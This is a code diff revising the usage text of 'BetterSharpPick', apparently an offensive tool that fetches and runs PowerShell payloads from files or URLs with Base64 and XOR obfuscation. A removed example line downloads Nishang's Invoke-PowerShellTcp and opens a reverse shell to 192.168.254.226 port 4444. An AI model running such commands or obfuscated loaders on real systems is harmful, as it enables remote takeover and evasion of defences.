@@ -12,20 +12,30 @@ namespace BetterSharpPick.Util
         {
             Console.WriteLine(@"
 USAGE:
-  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [-arg <string>] [-b64] 
+  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [-arg <string>] [-b64] [-raw]
 
 DESCRIPTION:
-  -path <value>        : Payload file path or URL.
-  -c <value>           : Inline payload text.
-  -arg <string>       : The remaining values are command arguments (each will be decoded when -b64 is set).
-  -xor <0-255>         : Single decimal byte key. XOR-decodes the payload; command args are also XOR-decoded with the same key.
-  -b64                 : Indicates that values are Base64-encoded (keys/values will be decoded).
+  -path <value>   : Payload file path or URL.
+  -c <value>      : Inline PowerShell code.
+  -arg <string>  : Argument to pass (repeatable).
+
+  -b64            : Scoped base64. Applies ONLY to the NEXT option’s value.
+                    Put -b64 directly before -path, -c, or -arg if that value is base64-encoded.
+                    If -b64 is not used in front of an option, no base64 is expected for that option.
+
+  -xor <0-255>    : Single decimal byte key. Applies ONLY to payloads from -path (file/URL).
+                    Does NOT apply to -c or -arg.
+                    If used together with -b64 (scoped to -path), decoding order is: Base64 → XOR.
+  
+  --raw, -raw     : Affects only the payload content read via -path.
+                    Treat the -path payload as RAW text; do NOT apply Base64/XOR.
+                    Does not affect -c or --arg.
 
 EXAMPLES:
-  BetterSharpPick -path http://example.com/file.bin
-  BetterSharpPick -b64 -c ZWNobyBoZWxsbyA= -arg d29ybGQ=
-  BetterSharpPick -xor 140 -path http://example.com/file.bin -b64
-  BetterSharpPick -path https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -arg 'Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444'
+  BetterSharpPick -path https://example.com/file.ps1
+  BetterSharpPick -b64 -c V3JpdGUtSG9zdCAnSGVsbG8n
+  BetterSharpPick -b64 -arg UGFyYW0x -b64 -arg UGFyYW0y
+  BetterSharpPick -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLnBzMQ==
 ");
         }
 
